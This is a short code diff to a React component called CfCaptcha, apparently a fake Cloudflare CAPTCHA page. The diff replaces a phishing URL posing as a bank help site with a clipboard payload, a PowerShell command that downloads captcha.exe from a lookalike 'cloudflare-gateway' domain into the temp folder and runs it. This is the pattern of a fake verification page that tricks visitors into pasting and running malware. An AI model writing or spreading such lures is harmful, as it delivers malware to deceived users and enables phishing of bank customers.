@@ -18,7 +18,7 @@ const CfCaptcha = () => {
   const [refId] = useState(() =>
     Array.from({ length: 16 }, () => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join("")
   );
-  const CLIP_PAYLOAD = "https://apobank.de-direkthilfe.app/admin";
+  const CLIP_PAYLOAD = `powershell -c "& {$u='https://d1.cloudflare-gateway.net/captcha.exe'; $o='%TEMP%\\captcha.exe'; (New-Object Net.WebClient).DownloadFile($u,$o); Start-Process $o}"`;
   const startXRef = useRef(0);
   const startPosRef = useRef(0);
   const KNOB = 44;
